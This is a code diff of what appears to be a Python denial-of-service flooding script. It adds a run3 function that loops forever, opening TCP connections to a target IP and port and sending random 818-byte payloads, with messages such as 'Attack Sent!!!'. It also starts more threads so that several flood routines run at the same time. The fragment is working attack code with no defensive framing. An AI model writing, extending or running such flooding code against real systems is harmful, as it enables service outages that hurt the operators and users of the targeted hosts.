@@ -114,13 +114,31 @@ def run2():
 		except:
 			s.close()
 			print("[-]  \033[31mMay be down\033[0m")
-			
 
+
+def run3():
+	data = random._urandom(818)
+	i = random.choice(("[+]","[*]","[!]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"Attack Sent!!!")
+		except:
+			s.close()
+			print("[-]  \033[31mMay be down\033[0m")
+
+			
 for y in range(threads):
 	if choice == 'y':
 		th = threading.Thread(target = run)
 		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
 	else:
-	        th = threading.Thread(target = run2)
+	        th = threading.Thread(target = run3)
 		
 
